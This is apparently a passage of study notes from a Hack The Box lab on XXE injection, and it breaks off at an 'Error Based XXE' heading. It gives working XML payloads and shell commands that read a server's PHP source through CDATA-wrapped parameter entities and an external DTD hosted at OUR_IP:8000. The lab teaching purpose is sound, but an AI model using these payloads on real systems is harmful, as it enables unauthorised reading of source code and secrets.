# 🦑 Advanced File Disclosure

In some cases, the web application may not output any input values in some instances, so we may try to force it through errors.

### Advanced Exfiltration with CDATA

To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

We have to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

if we reference the `&joined;` entity, it should contain our escaped data. However, `this will not work, since XML prevents joining internal and external entities`

To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD

```xml
<!ENTITY joined "%begin;%file;%end;">
```

```shell-session
ElFelixi0@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
ElFelixi0@htb[/htb]$ python3 -m http.server 8000
```

Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

<figure><img src="../../../../.gitbook/assets/image (1435).png" alt=""><figcaption></figcaption></figure>

### Error Based XXE
